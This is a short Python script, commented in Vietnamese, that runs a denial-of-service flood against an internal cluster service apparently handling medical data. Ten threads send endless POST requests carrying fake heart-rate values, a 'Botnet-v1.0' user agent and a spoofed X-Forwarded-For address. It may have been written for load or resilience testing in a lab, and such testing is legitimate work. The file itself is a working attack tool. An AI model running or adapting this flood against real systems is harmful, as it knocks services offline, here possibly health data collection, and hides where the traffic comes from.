import requests
import threading
import time

# URL thông qua Ingress hoặc Service nội bộ
TARGET_URL = "http://target-app-service.medical-data.svc.cluster.local/collect"
THREADS = 10  # Số luồng tấn công cùng lúc


def attack():
    while True:
        payload = {"heart_rate": 999, "note": "DDOS_ATTACK"}
        headers = {
            "User-Agent": "Botnet-v1.0",
            "X-Forwarded-For": f"10.0.0.{threading.get_ident() % 255}"  # Giả lập Spoofed IP
        }
        try:
            requests.post(TARGET_URL, json=payload, headers=headers, timeout=1)
            # Không sleep hoặc sleep rất ngắn để tạo Flood
        except:
            pass


if __name__ == "__main__":
    print(f"Starting DDoS Attack with {THREADS} threads...")
    for i in range(THREADS):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()

    while True: time.sleep(1)